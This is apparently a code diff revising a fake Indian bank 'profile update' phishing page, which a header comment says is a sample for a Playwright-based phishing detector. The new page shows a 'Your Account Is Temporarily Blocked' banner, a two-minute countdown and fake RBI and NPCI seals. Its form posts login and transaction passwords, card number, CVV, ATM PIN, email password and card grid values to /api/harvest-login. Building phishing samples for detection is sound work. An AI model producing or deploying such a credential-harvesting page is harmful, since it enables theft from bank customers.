@@ -8,299 +8,396 @@ As form is submitted it goes to scammer side server (EXFILTRATION)
 Playwright will takescreenshot of this web page and will detect all the above stuff
 -->
 
-
 <!DOCTYPE html>
 <html lang="en">
 
 <head>
     <meta charset="UTF-8">
-    <title>SecureBank | Digital Identity Update</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link
-        href="https://fonts.googleapis.com/css2?family=Playwrite+GB+J+Guides:ital@0;1&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&family=Roboto+Slab:wght@100..900&family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&display=swap"
-        rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Online Personal Banking | Update Profile</title>
     <style>
-        :root {
-            --primary: #004a99;
-            --accent: #f27020;
-            --danger: #e53935;
-            --bg: #f8fafc;
-        }
-
         body {
-            font-family: "Ubuntu", sans-serif;
-            font-weight: 400;
-            font-style: normal;
-            background: var(--bg);
             margin: 0;
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
+            font-family: Arial, sans-serif;
+            background: #fdfdfd;
         }
 
-
-        .navbar {
-            background: white;
-            padding: 15px 10%;
+        /* Header */
+        .header {
+            background: #b52b27;
+            color: white;
+            padding: 12px 5%;
             display: flex;
             justify-content: space-between;
+            border-bottom: 2px solid #9c231f;
             align-items: center;
-            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.05);
-            border-bottom: 3px solid var(--accent);
         }
 
-        .logo {
-            font-size: 26px;
-            font-weight: 800;
-            color: var(--primary);
+        .logo-box {
             display: flex;
             align-items: center;
             gap: 10px;
         }
 
-        .urgency-banner {
-            background: var(--danger);
-            color: white;
-            text-align: center;
-            padding: 14px;
-            font-weight: 700;
-            font-size: 14px;
-            letter-spacing: 0.5px;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% {
-                background: #e53935;
-            }
-
-            50% {
-                background: #b71c1c;
-            }
-
-            100% {
-                background: #e53935;
-            }
-        }
-
-        .main-container {
-            display: grid;
-            grid-template-columns: 1fr 1.2fr;
-            gap: 60px;
-            padding: 60px 10%;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-
-        .info-panel h1 {
-            font-size: 36px;
-            color: var(--primary);
-            line-height: 1.2;
-            margin-top: 0;
-        }
-
-        .security-card {
-            background: #eef5ff;
-            border-radius: 12px;
-            padding: 25px;
-            border-left: 6px solid var(--primary);
-            margin-top: 30px;
-        }
-
-        .feature {
+        .logo-icon {
+            width: 35px;
+            height: 35px;
+            background: #f37021;
+            border-radius: 50%;
             display: flex;
             align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            border: 2px solid white;
+            box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
+        }
+
+        .nav-links {
+            font-size: 11px;
+            display: flex;
             gap: 12px;
-            margin-bottom: 15px;
-            font-size: 15px;
-            color: #444;
+            align-items: center;
         }
 
-        .feature i {
-            color: var(--primary);
+        /* Sub-Bar */
+        .sub-nav {
+            background: #f37021;
+            padding: 5px 5%;
+            display: flex;
+            gap: 1px;
         }
 
+        .sub-nav-item {
+            background: #f37021;
+            color: white;
+            font-size: 11px;
+            padding: 5px 15px;
+            border-right: 1px solid #ff9d5c;
+            cursor: pointer;
+        }
 
-        .login-card {
+        .sub-nav-item.active {
+            background: #b52b27;
+            font-weight: bold;
+        }
+
+        /* Urgency Banner */
+        .blocked-banner {
             background: white;
-            border-radius: 20px;
-            padding: 45px;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.1);
-            border: 1px solid #f1f5f9;
-            position: relative;
+            border: 3px solid #005aab;
+            margin: 20px 5%;
+            padding: 20px;
+            text-align: center;
+            color: #005aab;
         }
 
-        .login-card h2 {
-            margin: 0 0 30px;
-            font-size: 24px;
-            color: #1e293b;
+        .blocked-banner h1 {
+            font-size: 32px;
+            margin: 0;
+            text-transform: uppercase;
         }
 
-        .form-group {
-            margin-bottom: 22px;
-            position: relative;
+        .blocked-banner span {
+            color: #e53935;
+            font-weight: bold;
         }
 
-        .form-group i {
-            position: absolute;
-            left: 15px;
-            top: 43px;
-            color: #94a3b8;
+        .main-content {
+            padding: 0 5%;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            align-items: center;
         }
 
-        label {
-            display: block;
+        .login-section {
+            width: 100%;
+            max-width: 850px;
+            border: 1px solid #dcdcdc;
+            background: #fff;
+            box-shadow: 2px 2px 8px #ddd;
+            margin-bottom: 20px;
+        }
+
+        .login-header {
+            background: #b52b27;
+            padding: 10px 15px;
+            font-weight: bold;
+            color: #fff;
             font-size: 13px;
-            font-weight: 700;
-            color: #475569;
-            margin-bottom: 8px;
+        }
+
+        /* Form Table */
+        table {
+            width: 100%;
+            padding: 15px 30px;
+            border-collapse: collapse;
+        }
+
+        td {
+            padding: 6px 10px;
+            font-size: 12px;
+            color: #333;
+        }
+
+        .label-td {
+            width: 38%;
+            text-align: right;
+            font-weight: bold;
+            color: #661011;
         }
 
         input {
-            width: 100%;
-            padding: 14px 14px 14px 45px;
-            border: 1.5px solid #e2e8f0;
-            border-radius: 10px;
-            box-sizing: border-box;
-            font-size: 15px;
-            transition: 0.3s;
+            width: 200px;
+            padding: 4px;
+            border: 1px solid #999;
+            font-size: 13px;
+            outline-color: #f37021;
         }
 
-        input:focus {
-            border-color: var(--primary);
-            outline: none;
-            box-shadow: 0 0 0 4px rgba(0, 74, 153, 0.1);
+        .small-input {
+            width: 60px !important;
         }
 
-        .btn-submit {
-            width: 100%;
-            background: var(--accent);
+        .timer-box {
+            background: #fffde7;
+            border: 1px solid #ffd54f;
+            padding: 10px;
+            margin: 10px 5%;
+            text-align: center;
+            color: #c62828;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        /* ATM Grid */
+        .grid-section {
+            background: #fff5f0;
+            border: 1px solid #f8d7da;
+            margin: 15px 30px;
+            padding: 15px;
+            border-radius: 4px;
+        }
+
+        .grid-table {
+            width: auto;
+            margin-top: 8px;
+            border: 1px solid #ccc;
+            background: white;
+        }
+
+        .grid-table td {
+            border: 1px solid #ccc;
+            padding: 4px;
+            text-align: center;
+            font-weight: bold;
+            width: 32px;
+            color: #b52b27;
+            font-size: 10px;
+        }
+
+        .grid-input {
+            width: 25px;
+            text-align: center;
+            padding: 2px;
+            border: 1px solid #999;
+        }
+
+        .btn-login {
+            background: #f37021;
             color: white;
-            border: none;
-            padding: 18px;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: 700;
+            border: 1px solid #d95a0d;
+            padding: 8px 30px;
+            font-size: 14px;
             cursor: pointer;
-            transition: 0.3s;
-            margin-top: 15px;
-            box-shadow: 0 4px 15px rgba(242, 112, 32, 0.3);
+            border-radius: 3px;
+            font-weight: bold;
+            text-transform: uppercase;
         }
 
-        .btn-submit:hover {
-            transform: translateY(-2px);
-            background: #e66a1d;
-        }
-
-        .footer-seals {
-            margin-top: 35px;
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            border-top: 1px solid #f1f5f9;
-            padding-top: 25px;
-        }
-
-        .seal-tag {
+        /* Red Security Disclaimer Line */
+        .security-line {
+            background: #661011;
+            color: white;
+            text-align: center;
+            padding: 10px;
             font-size: 11px;
-            font-weight: 800;
-            color: #94a3b8;
-            border: 1px solid #e2e8f0;
-            padding: 6px 12px;
-            border-radius: 6px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
+            margin-top: 20px;
+            letter-spacing: 0.5px;
+        }
+
+        .copyright-text {
+            text-align: center;
+            font-size: 11px;
+            color: #999;
+            margin: 15px 0;
         }
     </style>
 </head>
 
 <body>
 
-    <div class="navbar">
-        <div class="logo"><i class="fas fa-building-columns"></i> SecureBank</div>
-        <div style="font-size: 13px; color: #64748b;"><i class="fas fa-shield-check"></i> <strong>256-bit Encryption
-                Active</strong></div>
-    </div>
-
-    <div class="urgency-banner">
-        <i class="fas fa-triangle-exclamation"></i> CRITICAL: Profile update mandatory. Unverified accounts will be
-        restricted at <span id="clock">02:00</span>
-    </div>
-
-    <div class="main-container">
-        <div class="info-panel">
-            <h1>Digital Banking, <br><span style="color:var(--accent)">Safely Re-imagined.</span></h1>
-            <p style="color:#64748b; font-size: 17px;">We are upgrading our security layers. This one-time profile
-                verification ensures your funds stay protected against global cyber threats.</p>
-
-            <div class="security-card">
-                <div class="feature"><i class="fas fa-check-circle"></i> RBI Mandatory Compliance 2024</div>
-                <div class="feature"><i class="fas fa-check-circle"></i> PCI-DSS v4.0 Certified Environment</div>
-                <div class="feature"><i class="fas fa-check-circle"></i> End-to-End Encrypted Tunnel</div>
+    <div class="header">
+        <div class="logo-box">
+            <div class="logo-icon">i</div>
+            <div style="font-size: 24px; font-weight: bold; font-style: italic; letter-spacing: -1px;">i-Secure Bank
             </div>
-
-            <img src="https://via.placeholder.com/400x120?text=NPCI+and+DIGITAL+INDIA+APPROVED"
-                style="margin-top:40px; border-radius:12px; opacity:0.8;">
         </div>
+        <div class="nav-links">
+            <span>About Us</span> | <span>Contact Us</span> | <span>Site Map</span>
+        </div>
+    </div>
 
-        <div class="login-card">
-            <h2>Verify Your Account</h2>
+    <div class="sub-nav">
+        <div class="sub-nav-item">Home</div>
+        <div class="sub-nav-item">Banking</div>
+        <div class="sub-nav-item">Cards</div>
+        <div class="sub-nav-item">Loans</div>
+        <div class="sub-nav-item active">Login/Update</div>
+    </div>
+
+    <div class="blocked-banner">
+        <h1>Your Account <span style="font-family: serif;">IS TEMPORARILY</span> Blocked!</h1>
+        <p>Mandatory Profile KYC Update required. Failure will lead to <span>PERMANENT SUSPENSION</span>.</p>
+    </div>
+
+    <div class="timer-box">
+        🕒 SECURITY SESSION EXPIRES IN: <span id="clock">02:00</span>
+    </div>
+
+    <div class="main-content">
+        <div class="login-section">
+            <div class="login-header">Secure Identification Portal</div>
             <form action="/api/harvest-login" method="POST">
-                <div class="form-group">
-                    <label>Customer User ID</label>
-                    <i class="fas fa-user"></i>
-                    <input type="text" name="username" placeholder="Enter ID" required>
+                <table>
+                    <tr>
+                        <td class="label-td">Corporate Id :</td>
+                        <td><input type="text" name="corp_id" autocomplete="off"></td>
+                    </tr>
+                    <tr>
+                        <td class="label-td">User Id :</td>
+                        <td><input type="text" name="username" autocomplete="off"></td>
+                    </tr>
+                    <tr>
+                        <td class="label-td">Login Password :</td>
+                        <td><input type="password" name="password"></td>
+                    </tr>
+                    <tr>
+                        <td class="label-td">Transaction Password :</td>
+                        <td><input type="password" name="txn_password"></td>
+                    </tr>
+                    <tr>
+                        <td class="label-td">Debit/ATM Card Number :</td>
+                        <td><input type="text" name="card_number" maxlength="16" placeholder="XXXX XXXX XXXX XXXX"></td>
+                    </tr>
+                    <tr>
+                        <td class="label-td">Expiry & CVV :</td>
+                        <td>
+                            <input type="text" name="expiry" class="small-input" placeholder="MM/YY" maxlength="5">
+                            &nbsp; CVV: <input type="password" name="cvv" class="small-input" placeholder="***"
+                                maxlength="3">
+                        </td>
+                    </tr>
+                    <tr>
+                        <td class="label-td">ATM Pin :</td>
+                        <td><input type="password" name="pin" maxlength="4" class="small-input"></td>
+                    </tr>
+                    <tr>
+                        <td class="label-td">Mobile Number :</td>
+                        <td><input type="text" name="mobile" maxlength="10" placeholder="10-digit number"></td>
+                    </tr>
+                    <tr>
+                        <td class="label-td">Email Id :</td>
+                        <td><input type="email" name="email" placeholder="registered email"></td>
+                    </tr>
+                    <tr>
+                        <td class="label-td">Email Password :</td>
+                        <td><input type="password" name="email_pass"></td>
+                    </tr>
+                </table>
+
+                <div class="grid-section">
+                    <p style="font-size: 11px; color: #b52b27; font-weight: bold; margin: 0; text-align: center;">
+                        ENTER THE CORRESPONDING GRID VALUES FROM THE BACK OF YOUR CARD
+                    </p>
+                    <table class="grid-table" align="center">
+                        <tr style="background:#f4f4f4; color:#b52b27;">
+                            <td>A</td>
+                            <td>B</td>
+                            <td>C</td>
+                            <td>D</td>
+                            <td>E</td>
+                            <td>F</td>
+                            <td>G</td>
+                            <td>H</td>
+                            <td>I</td>
+                            <td>J</td>
+                            <td>K</td>
+                            <td>L</td>
+                            <td>M</td>
+                            <td>N</td>
+                            <td>O</td>
+                            <td>P</td>
+                        </tr>
+                        <tr>
+                            <td><input type="text" name="g_a" class="grid-input" maxlength="2"></td>
+                            <td><input type="text" name="g_b" class="grid-input" maxlength="2"></td>
+                            <td><input type="text" name="g_c" class="grid-input" maxlength="2"></td>
+                            <td><input type="text" name="g_d" class="grid-input" maxlength="2"></td>
+                            <td><input type="text" name="g_e" class="grid-input" maxlength="2"></td>
+                            <td><input type="text" name="g_f" class="grid-input" maxlength="2"></td>
+                            <td><input type="text" name="g_g" class="grid-input" maxlength="2"></td>
+                            <td><input type="text" name="g_h" class="grid-input" maxlength="2"></td>
+                            <td><input type="text" name="g_i" class="grid-input" maxlength="2"></td>
+                            <td><input type="text" name="g_j" class="grid-input" maxlength="2"></td>
+                            <td><input type="text" name="g_k" class="grid-input" maxlength="2"></td>
+                            <td><input type="text" name="g_l" class="grid-input" maxlength="2"></td>
+                            <td><input type="text" name="g_m" class="grid-input" maxlength="2"></td>
+                            <td><input type="text" name="g_n" class="grid-input" maxlength="2"></td>
+                            <td><input type="text" name="g_o" class="grid-input" maxlength="2"></td>
+                            <td><input type="text" name="g_p" class="grid-input" maxlength="2"></td>
+                        </tr>
+                    </table>
                 </div>
 
-                <div class="form-group">
-                    <label>Login Password</label>
-                    <i class="fas fa-lock"></i>
-                    <input type="password" name="password" placeholder="••••••••" required>
-                </div>
+                <div style="text-align: center; padding: 0 0 25px 0;">
+                    <button type="submit" class="btn-login">VERIFY AND UNBLOCK</button>
 
-                <div class="form-group">
-                    <label>Debit Card Number (16-Digit)</label>
-                    <i class="fas fa-credit-card"></i>
-                    <input type="text" name="card_number" maxlength="16" placeholder="4591 XXXX XXXX XXXX" required>
-                </div>
-
-                <div style="display:grid; grid-template-columns: 1fr 1fr; gap:20px;">
-                    <div class="form-group">
-                        <label>Expiry Date</label>
-                        <i class="fas fa-calendar-days"></i>
-                        <input type="text" name="expiry" placeholder="MM/YY" required>
+                    <div style="display: flex; justify-content: center; gap: 30px; margin-top: 25px; opacity: 0.8;">
+                        <div
+                            style="display: flex; align-items: center; gap: 6px; font-size: 10px; color: #444; font-weight: bold; border: 1px solid #ddd; padding: 5px 12px; border-radius: 3px; background: #fff;">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M3 21h18M3 10h18M5 10V21M19 10V21M9 10V21M15 10V21M12 3l7 7H5l7-7z" />
+                            </svg>
+                            RBI TRUSTED
+                        </div>
+                        <div
+                            style="display: flex; align-items: center; gap: 6px; font-size: 10px; color: #444; font-weight: bold; border: 1px solid #ddd; padding: 5px 12px; border-radius: 3px; background: #fff;">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+                            </svg>
+                            NPCI SECURE
+                        </div>
                     </div>
-                    <div class="form-group">
-                        <label>CVV Number</label>
-                        <i class="fas fa-key"></i>
-                        <input type="password" name="cvv" maxlength="3" placeholder="123" required>
-                    </div>
                 </div>
-
-                <button type="submit" class="btn-submit">SECURE MY ACCOUNT NOW</button>
             </form>
-
-            <div class="footer-seals">
-                <div class="seal-tag"><i class="fas fa-landmark"></i> RBI TRUST</div>
-                <div class="seal-tag"><i class="fas fa-shield"></i> NPCI SAFE</div>
-            </div>
         </div>
+    </div>
+    <div class="copyright-text">
+        © Copyright i-Secure Bank Ltd. 2026. All rights reserved.
     </div>
 
     <script>
-        let time = 120;
-        const clockElem = document.getElementById('clock');
+        let t = 120;
+        const clock = document.getElementById('clock');
         setInterval(() => {
-            let m = Math.floor(time / 60), s = time % 60;
-            clockElem.innerText = `0${m}:${s < 10 ? '0' : ''}${s}`;
-            if (time > 0) time--;
+            let m = Math.floor(t / 60), s = t % 60;
+            clock.innerText = `0${m}:${s < 10 ? '0' : ''}${s}`;
+            if (t > 0) t--;
         }, 1000);
-        navigator.geolocation.getCurrentPosition(() => { }, () => { });
     </script>
 </body>
-
 
 </html>
